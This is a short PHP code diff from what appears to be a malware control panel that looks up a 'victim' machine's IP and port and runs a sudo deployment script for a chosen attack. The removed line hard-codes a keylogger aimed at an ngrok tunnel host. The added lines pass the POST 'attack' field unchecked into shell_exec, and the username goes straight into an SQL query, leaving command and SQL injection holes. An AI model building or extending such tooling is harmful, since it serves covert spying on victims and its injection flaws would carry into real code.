@@ -4,6 +4,7 @@
 require 'connect.php';
 
 $user = $_POST['userName'];
+$attack = $_POST['attack'];
 $sql = "SELECT CurrentIP, CurrentPort FROM victim WHERE UserName='".$user."'";
 $result = $conn->query($sql);
 if ($result->num_rows > 0) {
@@ -17,7 +18,7 @@ if ($result->num_rows > 0) {
     echo "ERROR";
 }
 # this works now
-$command ="sudo /var/www/html/deployPwsh.sh keylog testUser1 7.tcp.eu.ngrok.io 15082";
+$command ="sudo /var/www/html/deployPwsh.sh ".$attack." ".$user." ".$ip." ".$port;
 echo (shell_exec($command));
 ?>
 </pre>
